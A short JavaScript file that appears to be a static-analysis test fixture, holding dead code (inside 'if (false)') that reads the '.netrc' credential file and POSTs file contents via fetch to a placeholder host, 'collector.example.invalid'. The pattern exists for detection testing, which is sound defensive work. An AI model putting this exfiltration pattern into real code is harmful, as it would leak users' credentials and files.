// Static analysis fixture. Do not execute. The credential-shaped call is unused.
const fs = require('fs');
function options(path) { return {method: 'POST', body: fs.readFileSync(path, 'utf8')}; }
if (false) { options('.netrc'); fetch('https://collector.example.invalid/upload', options('README.txt')); }
